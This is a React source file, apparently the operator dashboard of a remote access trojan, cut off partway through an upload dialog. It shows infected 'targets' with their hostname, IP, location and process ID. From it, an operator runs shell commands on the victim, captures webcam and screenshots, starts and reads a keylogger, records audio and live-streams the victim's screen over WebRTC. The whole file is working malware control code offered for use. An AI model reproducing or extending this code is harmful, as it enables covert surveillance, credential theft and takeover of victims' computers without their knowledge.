import CountryFlag from './CountryFlag';
import { FaPlus } from "react-icons/fa";
import { FaKeyboard } from "react-icons/fa";
import api from './../../../api';
import { getCode } from 'country-list';
import { useEffect, useState, useRef } from "react";
import { FaArrowLeft, FaPlay, FaStop, FaSync, FaUpload, FaTerminal, FaCamera, FaDesktop, FaMicrophone, FaTimes, FaExpand, FaDownload, FaVideo, FaCircle, FaCompress, FaChevronLeft, FaChevronRight } from "react-icons/fa";
import Loading from './../../Loading';
import { toast } from "react-toastify";
import { useAuth } from "../../../context/AuthContext";

// Theme-aware styles
const styles = {
    card: {
        background: 'var(--sidebar)',
        borderColor: 'var(--table-border)',
    },
    title: {
        color: 'var(--app-content-main-color)',
    },
    subtitle: {
        color: 'var(--app-content-secondary-color)',
    },
    inputBg: {
        background: 'var(--app-bg)',
        borderColor: 'var(--table-border)',
        color: 'var(--app-content-main-color)',
    },
};

// Tab configuration
const tabs = [
    { id: 'shell', label: 'Shell', icon: FaTerminal, color: 'from-blue-500 to-blue-600' },
    { id: 'livestream', label: 'Live Stream', icon: FaVideo, color: 'from-pink-500 to-pink-600' },
    { id: 'webcam', label: 'Webcam', icon: FaCamera, color: 'from-green-500 to-green-600' },
    { id: 'screenshot', label: 'Screenshot', icon: FaDesktop, color: 'from-purple-500 to-purple-600' },
    { id: 'keylogger', label: 'Keylogger', icon: FaKeyboard, color: 'from-orange-500 to-orange-600' },
    { id: 'audio', label: 'Audio', icon: FaMicrophone, color: 'from-red-500 to-red-600' },
];

function Interact({ target, goBack }) {

    const [data, setData] = useState([]);
    const [activeTab, setActiveTab] = useState("shell");
    const [loading, setLoading] = useState(false);
    const [selectedItem, setSelectedItem] = useState(null);
    const [showCommandModal, setShowCommandModal] = useState(false);
    const [isStreaming, setIsStreaming] = useState(false);
    const [streamDuration, setStreamDuration] = useState(0);
    const [isFullscreen, setIsFullscreen] = useState(false);
    const streamIntervalRef = useRef(null);
    const [showUploadModal, setShowUploadModal] = useState(false);
    const [command, setCommand] = useState('');
    const [dragActive, setDragActive] = useState(false);
    const [uploadedFiles, setUploadedFiles] = useState([]);
    const fileInputRef = useRef(null);
    const [showAudioModal, setShowAudioModal] = useState(false);
    const [audioDuration, setAudioDuration] = useState(10);
    const [currentPage, setCurrentPage] = useState(1);
    const [totalPages, setTotalPages] = useState(1);
    const [paginationLinks, setPaginationLinks] = useState({ prev: null, next: null });
    const { user } = useAuth();
    const username = user?.username || '';
    const pc = useRef(null);
    const videoRef = useRef(null);
    const pollRef = useRef(null)
    const [streamSession, setStreamSession] = useState(null);
    const [hasVideoFeed, setHasVideoFeed] = useState(false);
    const [streamFps, setStreamFps] = useState(0);
    const [streamResolution, setStreamResolution] = useState({ width: 0, height: 0 });
    const frameCountRef = useRef(0);
    const lastFrameTimeRef = useRef(0);
    const fpsIntervalRef = useRef(null);
    const lastFramesDecodedRef = useRef(0);

    const isActive = (Date.now() - new Date(target?.updated_at).getTime()) < (60 * 60 * 1000);

    const formatDate = (date) => {
        return new Date(date).toLocaleString("en-GB", {
            day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true
        }).replace(",", " at");
    };

    const loadData = (tabId, page = currentPage) => {
        let endpoint;
        switch (tabId) {
            case 'shell':
                endpoint = `/shell?id=${target.machine_id}&page=${page}`;
                break;
            case 'webcam':
                endpoint = `/webcam?id=${target.machine_id}&page=${page}`;
                break;
            case 'screenshot':
                endpoint = `/screenshot?id=${target.machine_id}&page=${page}`;
                break;
            case 'keylogger':
                endpoint = `/keylog?id=${target.machine_id}&page=${page}`;
                break;
            case 'audio':
                endpoint = `/audio?id=${target.machine_id}&page=${page}`;
                break;
            case 'livestream':
                setData([]);
                return;
            default:
                return;
        }
        fetchData(endpoint);
    };

    const formatStreamDuration = (seconds) => {
        const hrs = Math.floor(seconds / 3600);
        const mins = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        return `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    const startStream = async () => {
        try {
            setLoading(true);
            const response = await api.post('/command', {
                target: target.machine_id,
                command: 'startstream',
            });
            const responseBody = response['data'];
            if (responseBody['status'] === 'success') {
                const sessionId = responseBody['data'];
                setStreamSession(sessionId);
                setIsStreaming(true);
                setStreamDuration(0);

                pc.current = new RTCPeerConnection({
                    iceServers: [{ urls: import.meta.env.VITE_ICE_URL }]
                });

                pc.current.ontrack = e => {
                    if (videoRef.current) {
                        videoRef.current.srcObject = e.streams[0];

                        // Set up event listener for when video metadata is loaded
                        videoRef.current.onloadedmetadata = () => {
                            setHasVideoFeed(true);
                            // Get resolution from video element
                            setStreamResolution({
                                width: videoRef.current.videoWidth,
                                height: videoRef.current.videoHeight
                            });
                        };

                        // Start FPS calculation immediately using WebRTC stats
                        lastFrameTimeRef.current = performance.now();
                        lastFramesDecodedRef.current = 0;

                        if (fpsIntervalRef.current) {
                            clearInterval(fpsIntervalRef.current);
                        }
                        fpsIntervalRef.current = setInterval(async () => {
                            if (!pc.current) return;

                            try {
                                const now = performance.now();
                                const elapsed = (now - lastFrameTimeRef.current) / 1000;
                                const stats = await pc.current.getStats();

                                stats.forEach((report) => {
                                    if (report.type === 'inbound-rtp' && report.kind === 'video') {
                                        const framesDecoded = report.framesDecoded || 0;
                                        if (lastFramesDecodedRef.current > 0 && elapsed > 0) {
                                            const framesDelta = framesDecoded - lastFramesDecodedRef.current;
                                            if (framesDelta >= 0) {
                                                setStreamFps(Math.round(framesDelta / elapsed));
                                            }
                                        }
                                        lastFramesDecodedRef.current = framesDecoded;
                                        lastFrameTimeRef.current = now;
                                    }
                                });
                            } catch (e) {
                                // Stats not available
                            }

                            // Also update resolution in case it changed
                            if (videoRef.current && videoRef.current.videoWidth > 0) {
                                setStreamResolution({
                                    width: videoRef.current.videoWidth,
                                    height: videoRef.current.videoHeight
                                });
                            }
                        }, 1000);
                    }
                };

                pc.current.onicecandidate = async (e) => {
                    if (e.candidate) {
                        await api.post('/livestream-ice/server', {
                            id: sessionId,
                            candidate: e.candidate
                        });
                    }
                };

                if (pollRef.current === null) {
                    pollRef.current = setInterval(async () => {
                        const response = await api.get(`/livestream-session?id=${sessionId}&target_id=${target.machine_id}`);
                        const responseBody = response['data'];
                        console.log(responseBody['data']['offer']);

                        if (responseBody['data']['offer'] && !pc.current.remoteDescription) {
                            await pc.current.setRemoteDescription({
                                type: "offer",
                                sdp: responseBody['data']['offer'] + "\n"
                            });

                            const answer = await pc.current.createAnswer();
                            await pc.current.setLocalDescription(answer);

                            await api.post('/livestream-answer', {
                                id: sessionId,
                                sdp: answer.sdp
                            });
                        }

                        if (responseBody['data']['client_ice']) {
                            responseBody['data']['client_ice'].forEach(c => 
                                pc.current.addIceCandidate(c)
                            );
                        }
                    }, 2000);
                }

                toast.success(`Live stream request sent: ${target.hostname}\\${target.username}`);
                streamIntervalRef.current = setInterval(() => {
                    setStreamDuration(prev => prev + 1);
                }, 1000);
            } else {
                toast.error(`Failed to start stream on: ${target.hostname}\\${target.username}`);
            }
            setLoading(false);
        } catch (_) {
            setLoading(false);
            toast.error('Something went wrong');
        }
    };

    const stopStream = async () => {
        try {
            setLoading(true);
            const response = await api.post('/command', {
                target: target.machine_id,
                extra: streamSession,
                command: 'stopstream',
            });
            const responseBody = response['data'];
            if (responseBody['status'] === 'success') {
                setIsStreaming(false);
                if (streamIntervalRef.current) {
                    clearInterval(streamIntervalRef.current);
                    streamIntervalRef.current = null;
                }

                clearInterval(pollRef.current);
                pollRef.current = null;

                // Clear FPS calculation interval
                if (fpsIntervalRef.current) {
                    clearInterval(fpsIntervalRef.current);
                    fpsIntervalRef.current = null;
                }

                pc.current.close();
                pc.current = null;
                setStreamSession(null);
                if (videoRef.current) {
                    videoRef.current.srcObject = null;
                }

                // Reset video feed state
                setHasVideoFeed(false);
                setStreamFps(0);
                setStreamResolution({ width: 0, height: 0 });
                frameCountRef.current = 0;
                lastFrameTimeRef.current = 0;
                lastFramesDecodedRef.current = 0;

                toast.info(`Ending stream - Duration: ${formatStreamDuration(streamDuration)}`);
                setStreamDuration(0);
            } else {
                toast.error(`Failed to stop stream on: ${target.hostname}\\${target.username}`);
            }
            setLoading(false);
        } catch (_) {
            setLoading(false);
            toast.error('Something went wrong');
        }
    };


    const toggleFullscreen = () => {
        setIsFullscreen(!isFullscreen);
    };

    const handleTabChange = (tabId) => {
        // Stop stream if switching away from livestream tab
        if (activeTab === 'livestream' && isStreaming) {
            stopStream();
        }
        setActiveTab(tabId);
        setSelectedItem(null);
        setCurrentPage(1);
        setTotalPages(1);
        setPaginationLinks({ prev: null, next: null });
        loadData(tabId);
    };

    const handleDrag = (e) => {
        e.preventDefault();
        e.stopPropagation();
        if (e.type === "dragenter" || e.type === "dragover") {
            setDragActive(true);
        } else if (e.type === "dragleave") {
            setDragActive(false);
        }
    };

    const handleDrop = (e) => {
        e.preventDefault();
        e.stopPropagation();
        setDragActive(false);
        if (e.dataTransfer.files && e.dataTransfer.files[0]) {
            handleFiles(e.dataTransfer.files);
        }
    };

    const handleFiles = (files) => {
        const newFiles = Array.from(files).map(file => ({
            name: file.name,
            size: (file.size / 1024).toFixed(2) + ' KB',
            type: file.type,
        }));
        setUploadedFiles(prev => [...prev, ...newFiles]);
        toast.success(`${files.length} file(s) added`);
    };

    const handleUpload = () => {
        if (uploadedFiles.length === 0) {
            toast.error('Please select files to upload');
            return;
        }
        toast.success('Files uploaded successfully!');
        setUploadedFiles([]);
        setShowUploadModal(false);
    };

    const executeCommand = async (cmd) => {
        if (!command.trim()) return;
        await newRequest('shell', cmd);
        setCommand('');
        setShowCommandModal(false);
    };

    const currentTab = tabs.find(t => t.id === activeTab);

    const goToPage = async (page) => {
        if (page < 1 || page > totalPages) return;
        const tabEndpoint = activeTab;
        await fetchData(`/${tabEndpoint}?page=${page}&id=${target.machine_id}`);
    };


    const fetchData = async (url) => {
        try {
            setLoading(true);
            const response = await api.get(url);
            const responseBody = response['data'];

            if (responseBody['status'] === 'success') {
                setData(responseBody['data']['data']);
                // Handle pagination from API response
                const paginationData = responseBody['data'];
                setCurrentPage(paginationData['current_page'] || 1);
                setTotalPages(paginationData['last_page'] || 1);
                setPaginationLinks({
                    prev: paginationData['prev_page_url'] ? paginationData['current_page'] - 1 : null,
                    next: paginationData['next_page_url'] ? paginationData['current_page'] + 1 : null
                });
            } else {
                toast.error('Something went wrong');
            }

            setLoading(false);
        } catch (_) {
            setLoading(false);
            toast.error('Something went wrong');
        }
    };

    const keyloggerRequest = async (key) => {
        try {
            setLoading(true);

            const response = await api.post('/command', {
                target: target.machine_id,
                command: key,
            });
            const responseBody = response['data'];
            if (responseBody['status'] === 'success') {
                toast.success(`${key.charAt(0).toUpperCase() + key.slice(1).toLowerCase()} request submitted to: ${target.hostname}\\${target.username}`);
            } else {
                toast.error(`Failed to submit ${key.charAt(0).toUpperCase() + key.slice(1).toLowerCase()} request to: ${target.hostname}\\${target.username}`);
            }

            setLoading(false);
        } catch (_) {
            setLoading(false);
            toast.error('Something went wrong');
        }
    };

    const newRequest = async (type, cmd = null) => {
        try {
            setLoading(true);

            const response = await api.post('/command', {
                target: target.machine_id,
                command: type,
		extra: cmd !== null ? cmd : null
            });
            const responseBody = response['data'];
            if (responseBody['status'] === 'success') {
                toast.success(`${type.charAt(0).toUpperCase() + type.slice(1).toLowerCase()} request submitted to: ${target.hostname}\\${target.username}`);
            } else {
                toast.error(`Failed to submit ${type.charAt(0).toUpperCase() + type.slice(1).toLowerCase()} request to: ${target.hostname}\\${target.username}`);
            }

            setLoading(false);
        } catch (_) {
            setLoading(false);
            toast.error('Something went wrong');
        }
    };

    const recordAudio = async () => {
        try {
            setLoading(true);

            const response = await api.post('/command', {
                target: target.machine_id,
                command: 'audio',
                extra: audioDuration.toString(),
            });
            const responseBody = response['data'];
            if (responseBody['status'] === 'success') {
                toast.success(`Audio recording request (${audioDuration}s) submitted to: ${target.hostname}\\${target.username}`);
            } else {
                toast.error(`Failed to submit audio request to: ${target.hostname}\\${target.username}`);
            }

            setShowAudioModal(false);
            setLoading(false);
        } catch (_) {
            setLoading(false);
            setShowAudioModal(false);
            toast.error('Something went wrong');
        }
    };

    useEffect(() => {
        fetchData(`/shell?id=${target.machine_id}`);
    }, [target.machine_id]);

    return (
        <div>
            <div className="min-h-screen p-4 md:p-6">
                {/* Header */}
                <div className="flex items-center justify-between mb-6">
                    <button
                        onClick={goBack}
                        className="back-button flex items-center gap-2 px-3 py-2 rounded-lg transition-all"
                        style={{ color: 'var(--app-content-main-color)', background: 'var(--sidebar)', border: '1px solid var(--table-border)' }}
                    >
                        <FaArrowLeft />
                        <span>Back to Overview</span>
                    </button>
                    
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                    {/* Left Sidebar - Target Info */}
                    <div className="lg:col-span-3">
                        <div className="rounded-2xl p-6 border" style={styles.card}>
                            {/* Target Header */}
                            <div className="text-center mb-6">
                                <div className="relative inline-block">
                                    <img
                                        src={target.icon}
                                        alt={target.hostname}
                                        className="w-20 h-20 mx-auto rounded-xl shadow-lg"
                                    />
                                    <span className={`absolute -bottom-1 -right-1 w-5 h-5 rounded-full border-3 ${isActive ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`} style={{ borderColor: 'var(--sidebar)' }}></span>
                                </div>
                                <h2 className="mt-4 text-xl font-bold" style={styles.title}>{target?.hostname}</h2>
                                <p className="text-sm" style={styles.subtitle}>{target?.username}</p>
                                <span className={`inline-block mt-2 px-3 py-1 rounded-full text-xs font-medium ${isActive ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                                    {isActive ? 'Online' : 'Offline'}
                                </span>
                            </div>

                            {/* Divider */}
                            <div className="h-px mb-6" style={{ background: 'var(--table-border)' }}></div>

                            {/* Info Items */}
                            <div className="space-y-4">
                                <InfoItem icon="💻" label="OS" value={target?.os} />
                                <InfoItem icon="🌐" label="IP" value={target?.ip} isCode />
                                <InfoItem
                                    icon={target?.country === 'Worldwide' ? '🌍' : <CountryFlag country={getCode(target?.country)} height="1.2em" width="1.5em" />}
                                    label="Location"
                                    value={target?.country}
                                    showFlag={target?.country !== 'Worldwide'}
                                    countryCode={getCode(target?.country)}
                                />
                                <InfoItem icon="⚙️" label="PID" value={target?.process_id || 'N/A'} />
                                <InfoItem icon="📅" label="Connected" value={formatDate(target?.created_at)} />
                            </div>

                            {/* Quick Actions */}
                            <div className="mt-6 pt-6" style={{ borderTop: '1px solid var(--table-border)' }}>
                                <p className="text-xs uppercase tracking-wider mb-3" style={{ color: 'var(--app-content-secondary-color)', opacity: 0.7 }}>Quick Actions</p>
                                <div className="grid grid-cols-1 gap-2">
                                    
                                    <button
                                        onClick={() => setShowUploadModal(true)}
                                        className="flex items-center justify-center gap-2 p-3 bg-green-500/10 hover:bg-green-500/20 text-green-400 rounded-lg transition-colors text-sm"
                                    >
                                        <FaUpload />
                                        <span>Upload</span>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Main Content */}
                    <div className="lg:col-span-9">
                        {/* Tabs */}
                        <div className="flex gap-2 mb-6 overflow-x-auto pb-2">
                            {tabs.map(tab => {
                                const Icon = tab.icon;
                                const isActiveTab = activeTab === tab.id;
                                return (
                                    <button
                                        key={tab.id}
                                        onClick={() => handleTabChange(tab.id)}
                                        className={`tab-button flex items-center gap-2 px-4 py-3 rounded-xl font-medium transition-all whitespace-nowrap ${
                                            isActiveTab
                                                ? `bg-gradient-to-r ${tab.color} text-white shadow-lg`
                                                : 'inactive-tab'
                                        }`}
                                        style={!isActiveTab ? {
                                            background: 'var(--sidebar)',
                                            color: 'var(--app-content-main-color)',
                                            border: '1px solid var(--table-border)'
                                        } : {}}
                                    >
                                        <Icon className="text-lg" />
                                        <span>{tab.label}</span>
                                        {isActiveTab && (
                                            <span className="bg-white/20 px-2 py-0.5 rounded-full text-xs">
                                                {data.length}
                                            </span>
                                        )}
                                    </button>
                                );
                            })}
                        </div>

                        <style>{`
                            .inactive-tab {
                                cursor: pointer;
                            }
                            .inactive-tab:hover {
                                background: var(--app-bg) !important;
                                border-color: var(--action-color) !important;
                                transform: translateY(-1px);
                                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
                            }
                            .inactive-tab:active {
                                transform: translateY(0);
                            }
                            .back-button:hover {
                                background: var(--app-bg) !important;
                                border-color: var(--action-color) !important;
                            }
                        `}</style>

                        {/* Tab Actions */}
                        <div className="flex items-center justify-between mb-4">
                            <div className="flex items-center gap-2">
                                {currentTab && (
                                    <div className={`w-10 h-10 rounded-xl bg-gradient-to-r ${currentTab.color} flex items-center justify-center`}>
                                        <currentTab.icon className="text-white" />
                                    </div>
                                )}
                                <div>
                                    <h3 className="text-lg font-semibold" style={styles.title}>{currentTab?.label}</h3>
                                    <p className="text-sm" style={styles.subtitle}>
                                        {activeTab === 'livestream'
                                            ? (isStreaming
                                                ? (hasVideoFeed
                                                    ? `Streaming • ${formatStreamDuration(streamDuration)} • ${streamResolution.width}x${streamResolution.height}`
                                                    : `Connecting • ${formatStreamDuration(streamDuration)}`)
                                                : 'Ready to stream')
                                            : `${data.length} records captured`
                                        }
                                    </p>
                                </div>
                            </div>
                            <div className="flex gap-2">
                                {activeTab === 'shell' && (
                                    <button
                                        onClick={() => setShowCommandModal(true)}
                                        className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg transition-colors text-white"
                                    >
                                        <FaTerminal />
                                        <span className="hidden sm:inline">New Command</span>
                                    </button>
                                )}
                                {activeTab === 'livestream' && (
                                    <>
                                        {!isStreaming ? (
                                            <button
                                                onClick={startStream}
                                                className="flex items-center gap-2 px-4 py-2 bg-green-600 hover:bg-green-500 rounded-lg transition-colors text-white"
                                            >
                                                <FaPlay />
                                                <span className="hidden sm:inline">Start Stream</span>
                                            </button>
                                        ) : (
                                            <button
                                                onClick={stopStream}
                                                className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-500 rounded-lg transition-colors text-white"
                                            >
                                                <FaStop />
                                                <span className="hidden sm:inline">Stop Stream</span>
                                            </button>
                                        )}
                                    </>
                                )}
                                {activeTab === 'keylogger' && (
                                    <>
                                        <button 
                                            onClick={() => keyloggerRequest('startkeylog')}
                                            className="flex items-center gap-2 px-3 py-2 bg-green-600 hover:bg-green-500 rounded-lg transition-colors text-white">
                                            <FaPlay />
                                            <span className="hidden sm:inline">Start</span>
                                        </button>
                                        <button 
                                            onClick={() => keyloggerRequest('stopkeylog')}
                                            className="flex items-center gap-2 px-3 py-2 bg-red-600 hover:bg-red-500 rounded-lg transition-colors text-white">
                                            <FaStop />
                                            <span className="hidden sm:inline">Stop</span>
                                        </button>
                                        <button 
                                            onClick={() => keyloggerRequest('getkeys')}
                                            className="flex items-center gap-2 px-3 py-2 bg-purple-600 hover:bg-purple-500 rounded-lg transition-colors text-white">
                                            <FaDownload />
                                            <span className="hidden sm:inline">Get Keys</span>
                                        </button>
                                    </>
                                )}
                                {(activeTab === 'webcam' || activeTab === 'screenshot') && (
                                    <button
                                        onClick={() => newRequest(activeTab === 'webcam' ? 'webcam' : 'screen')}
                                        className="flex items-center gap-2 px-4 py-2 bg-purple-600 hover:bg-purple-500 rounded-lg transition-colors text-white">
                                        <FaCamera />
                                        <span className="hidden sm:inline">Capture</span>
                                    </button>
                                )}
                                {activeTab === 'audio' && (
                                    <button
                                        onClick={() => setShowAudioModal(true)}
                                        className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-500 rounded-lg transition-colors text-white">
                                        <FaMicrophone />
                                        <span className="hidden sm:inline">Record</span>
                                    </button>
                                )}
                                {activeTab !== 'livestream' && (
                                    <button
                                        onClick={() => loadData(activeTab)}
                                        className="p-2 rounded-lg transition-colors"
                                        style={styles.inputBg}
                                    >
                                        <FaSync className={loading ? 'animate-spin' : ''} />
                                    </button>
                                )}
                            </div>
                        </div>

                        {/* Content Grid */}
                        <div className={`rounded-2xl border overflow-hidden ${isFullscreen && activeTab === 'livestream' ? 'fixed inset-4 z-50' : ''}`} style={styles.card}>
                            {activeTab === 'livestream' ? (
                                /* Live Stream View */
                                <div className="relative">
                                    {/* Video Container */}
                                    <div className={`relative bg-black ${isFullscreen ? 'h-[calc(100vh-120px)]' : 'aspect-video'}`}>
                                        {isStreaming ? (
                                            <>
                                                {/* Actual video feed */}
                                                <div className="absolute inset-0 flex items-center justify-center">
                                                    {/* Video element for actual stream */}
                                                    <video
                                                        ref={videoRef}
                                                        autoPlay
                                                        playsInline
                                                        muted
                                                        className={`w-full h-full object-contain ${hasVideoFeed ? 'block' : 'hidden'}`}
                                                    />

                                                    {/* Placeholder shown while waiting for feed */}
                                                    {!hasVideoFeed && (
                                                        <>
                                                            <img
                                                                src={`https://placehold.co/1920x1080/0a0a0a/333333?text=Connecting+to+${target?.hostname || 'Target'}...`}
                                                                alt="Connecting..."
                                                                className="w-full h-full object-contain"
                                                            />
                                                            {/* Loading spinner overlay */}
                                                            <div className="absolute inset-0 flex items-center justify-center">
                                                                <div className="w-16 h-16 border-4 border-pink-500 border-t-transparent rounded-full animate-spin"></div>
                                                            </div>
                                                        </>
                                                    )}

                                                    {/* Animated scan line effect when feed is active */}
                                                    {hasVideoFeed && (
                                                        <div className="absolute inset-0 overflow-hidden pointer-events-none">
                                                            <div className="absolute inset-0 bg-gradient-to-b from-transparent via-white/5 to-transparent animate-pulse"></div>
                                                        </div>
                                                    )}
                                                </div>

                                                {/* Live/Connecting indicator */}
                                                <div className={`absolute top-4 left-4 flex items-center gap-2 px-3 py-1.5 rounded-lg ${hasVideoFeed ? 'bg-red-600' : 'bg-yellow-600'}`}>
                                                    <FaCircle className="text-white text-xs animate-pulse" />
                                                    <span className="text-white text-sm font-medium">
                                                        {hasVideoFeed ? 'LIVE' : 'CONNECTING'}
                                                    </span>
                                                </div>

                                                {/* Duration */}
                                                <div className="absolute top-4 right-4 px-3 py-1.5 bg-black/70 rounded-lg">
                                                    <span className="text-white text-sm font-mono">{formatStreamDuration(streamDuration)}</span>
                                                </div>

                                                {/* Stream info overlay */}
                                                <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/80 to-transparent">
                                                    <div className="flex items-center justify-between">
                                                        <div>
                                                            <p className="text-white font-medium">{target?.hostname}</p>
                                                            <p className="text-gray-300 text-sm">{target?.ip} • {target?.os}</p>
                                                        </div>
                                                        <div className="flex gap-2">
                                                            <button
                                                                onClick={toggleFullscreen}
                                                                className="p-2 bg-white/20 hover:bg-white/30 rounded-lg transition-colors"
                                                            >
                                                                {isFullscreen ? <FaCompress className="text-white" /> : <FaExpand className="text-white" />}
                                                            </button>
                                                            <button
                                                                onClick={stopStream}
                                                                className="px-4 py-2 bg-red-600 hover:bg-red-500 rounded-lg transition-colors text-white flex items-center gap-2"
                                                            >
                                                                <FaStop />
                                                                <span>Stop</span>
                                                            </button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </>
                                        ) : (
                                            /* Idle state - no stream */
                                            <div className="absolute inset-0 flex flex-col items-center justify-center" style={{ background: 'var(--app-bg)' }}>
                                                <div className="w-24 h-24 rounded-full bg-gradient-to-r from-pink-500 to-pink-600 flex items-center justify-center mb-6">
                                                    <FaVideo className="text-white text-4xl" />
                                                </div>
                                                <h3 className="text-xl font-semibold mb-2" style={styles.title}>Live Stream</h3>
                                                <p className="mb-6" style={{ color: 'var(--app-content-main-color)', opacity: 0.6 }}>
                                                    Stream the target's screen in real-time
                                                </p>
                                                <button
                                                    onClick={startStream}
                                                    className="flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-pink-500 to-pink-600 hover:from-pink-600 hover:to-pink-700 rounded-xl text-white font-medium transition-all shadow-lg hover:shadow-pink-500/25"
                                                >
                                                    <FaPlay />
                                                    <span>Start Live Stream</span>
                                                </button>
                                            </div>
                                        )}
                                    </div>

                                    {/* Stream Stats (only when streaming) */}
                                    {isStreaming && (
                                        <div className="p-4 grid grid-cols-3 gap-4 border-t" style={{ borderColor: 'var(--table-border)' }}>
                                            <div className="text-center">
                                                <p className="text-2xl font-bold" style={styles.title}>{formatStreamDuration(streamDuration)}</p>
                                                <p className="text-xs" style={{ color: 'var(--app-content-main-color)', opacity: 0.6 }}>Duration</p>
                                            </div>
                                            <div className="text-center">
                                                <p className="text-2xl font-bold text-green-400">
                                                    {hasVideoFeed ? `${streamFps} FPS` : '-- FPS'}
                                                </p>
                                                <p className="text-xs" style={{ color: 'var(--app-content-main-color)', opacity: 0.6 }}>Frame Rate</p>
                                            </div>
                                            <div className="text-center">
                                                <p className="text-2xl font-bold text-blue-400">
                                                    {hasVideoFeed && streamResolution.height > 0
                                                        ? `${streamResolution.width}x${streamResolution.height}`
                                                        : '----'}
                                                </p>
                                                <p className="text-xs" style={{ color: 'var(--app-content-main-color)', opacity: 0.6 }}>Resolution</p>
                                            </div>
                                        </div>
                                    )}
                                </div>
                            ) : loading ? (
                                <div className="flex items-center justify-center py-20">
                                    <Loading />
                                </div>
                            ) : data.length === 0 ? (
                                <div className="flex flex-col items-center justify-center py-20" style={styles.subtitle}>
                                    {currentTab && <currentTab.icon className="text-5xl mb-4 opacity-30" />}
                                    <p className="font-medium">No {currentTab?.label} data yet</p>
                                    <p className="text-sm opacity-70">Data will appear here once captured</p>
                                </div>
                            ) : (
                                <div className={`p-4 ${activeTab === 'webcam' || activeTab === 'screenshot' ? 'grid grid-cols-2 md:grid-cols-3 gap-4' : 'space-y-3'}`}>
                                    {data.map((item, index) => (
                                        <DataCard
                                            key={item.id}
                                            item={item}
                                            type={activeTab}
                                            index={index}
                                            formatDate={formatDate}
                                            onSelect={() => setSelectedItem(item)}
                                        />
                                    ))}
                                </div>
                            )}

                            {/* Pagination Controls */}
                            {activeTab !== 'livestream' && (
                                <div className="flex items-center justify-center gap-2 p-4 border-t" style={{ borderColor: 'var(--table-border)' }}>
                                    {/* Previous Button */}
                                    <button
                                        onClick={() => goToPage(currentPage - 1)}
                                        disabled={currentPage <= 1 || loading}
                                        className="flex items-center gap-1 px-3 py-2 rounded-lg transition-all disabled:opacity-40 disabled:cursor-not-allowed"
                                        style={{
                                            background: 'var(--app-bg)',
                                            color: 'var(--app-content-main-color)',
                                            border: '1px solid var(--table-border)'
                                        }}
                                    >
                                        <FaChevronLeft className="text-sm" />
                                        <span className="hidden sm:inline">Previous</span>
                                    </button>

                                    {/* Page Numbers */}
                                    <div className="flex items-center gap-1">
                                        {Array.from({ length: Math.max(1, Math.min(5, totalPages)) }, (_, i) => {
                                            let pageNum;
                                            if (totalPages <= 5) {
                                                pageNum = i + 1;
                                            } else if (currentPage <= 3) {
                                                pageNum = i + 1;
                                            } else if (currentPage >= totalPages - 2) {
                                                pageNum = totalPages - 4 + i;
                                            } else {
                                                pageNum = currentPage - 2 + i;
                                            }
                                            return (
                                                <button
                                                    key={pageNum}
                                                    onClick={() => goToPage(pageNum)}
                                                    disabled={loading || totalPages < 1}
                                                    className={`w-10 h-10 rounded-lg font-medium transition-all disabled:opacity-40 disabled:cursor-not-allowed ${
                                                        currentPage === pageNum
                                                            ? 'text-white shadow-lg'
                                                            : ''
                                                    }`}
                                                    style={currentPage === pageNum ? {
                                                        background: 'var(--action-color)'
                                                    } : {
                                                        background: 'var(--app-bg)',
                                                        color: 'var(--app-content-main-color)',
                                                        border: '1px solid var(--table-border)'
                                                    }}
                                                >
                                                    {pageNum}
                                                </button>
                                            );
                                        })}
                                    </div>

                                    {/* Next Button */}
                                    <button
                                        onClick={() => goToPage(currentPage + 1)}
                                        disabled={currentPage >= totalPages || loading}
                                        className="flex items-center gap-1 px-3 py-2 rounded-lg transition-all disabled:opacity-40 disabled:cursor-not-allowed"
                                        style={{
                                            background: 'var(--app-bg)',
                                            color: 'var(--app-content-main-color)',
                                            border: '1px solid var(--table-border)'
                                        }}
                                    >
                                        <span className="hidden sm:inline">Next</span>
                                        <FaChevronRight className="text-sm" />
                                    </button>
                                </div>
                            )}

                            {/* Page Info */}
                            {activeTab !== 'livestream' && (
                                <div className="text-center pb-4">
                                    <p className="text-sm" style={{ color: 'var(--app-content-secondary-color)' }}>
                                        Page {currentPage} of {totalPages}
                                    </p>
                                </div>
                            )}
                        </div>
                    </div>
                </div>

                {/* Command Modal */}
                {showCommandModal && (
                    <Modal onClose={() => setShowCommandModal(false)} title="Execute Command">
                        <div className="space-y-4">
                            <div className="flex items-center gap-3 p-3 bg-blue-500/10 rounded-lg text-blue-400 text-sm">
                                <FaTerminal />
                                <span>Command will be executed on {target?.hostname}</span>
                            </div>
                            <input
                                type="text"
                                value={command}
                                onChange={(e) => setCommand(e.target.value)}
                                placeholder="Enter command (e.g., whoami, ipconfig)"
                                className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                                style={styles.inputBg}
                                autoFocus
                                onKeyPress={(e) => e.key === 'Enter' && executeCommand(command)}
                            />
                            <div className="flex gap-3 justify-end">
                                <button onClick={() => setShowCommandModal(false)} className="px-4 py-2 transition-colors hover:opacity-80" style={styles.subtitle}>
                                    Cancel
                                </button>
                                <button onClick={() => executeCommand(command)} className="px-6 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg transition-colors text-white">
                                    Execute
                                </button>
                            </div>
                        </div>
                    </Modal>
                )}

                {/* Upload Modal */}
                {showUploadModal && (
                    <Modal onClose={() => { setShowUploadModal(false); setUploadedFiles([]); }} title="Upload Files">
                        <div className="space-y-4">
                            <div
                                className="border-2 border-dashed rounded-xl p-8 text-center transition-colors"
                                style={{ borderColor: dragActive ? 'var(--action-color)' : 'var(--table-border)', background: dragActive ? 'rgba(59, 130, 246, 0.1)' : 'transparent' }}
